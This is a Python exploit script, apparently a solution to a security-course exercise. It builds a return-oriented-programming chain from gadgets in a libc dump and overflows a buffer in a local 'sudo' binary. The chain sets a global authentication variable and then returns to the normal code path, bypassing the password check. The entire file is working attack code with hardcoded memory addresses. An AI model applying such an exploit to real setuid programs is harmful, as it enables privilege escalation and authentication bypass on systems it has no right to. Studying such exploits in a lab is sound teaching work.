import os, sys, struct

import assemble
from search import GadgetSearch
import subprocess


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'
HEX_BASE = 16


def get_arg():
    gs = GadgetSearch(LIBC_DUMP_PATH, 0xb7c38750)
    auth_addr = 0x0804a054 # the address of the global auth variable
    normal_ret_addr = 0x080488c6 # the original retrun address from the function check_password
    pop_edx_addr = int(gs.find_format('pop edx')[1], HEX_BASE)
    xor_eax_addr = int(gs.find_format('xor eax, eax')[1], HEX_BASE)
    inc_eax_addr = int(gs.find_format('inc eax')[1], HEX_BASE)
    mov_edx_adrr = int(gs.find_format('mov [edx], eax')[1], HEX_BASE)
    buff = 'a' * (0x49 - len("thisisasalt")) # same as in q1
    old_ebp = 'b' * 4 # same as in q1
    buffer_part = buff + old_ebp
    # for more deatils on the order of the commands see q3.txt
    shellcode = struct.pack("<I", pop_edx_addr) + struct.pack("<I", auth_addr) + struct.pack("<I", xor_eax_addr) + \
     			struct.pack("<I", inc_eax_addr) + struct.pack("<I", mov_edx_adrr) + struct.pack("<I", normal_ret_addr)
    return buffer_part + shellcode

def main(argv):
	os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())

if __name__ == '__main__':
    main(sys.argv)
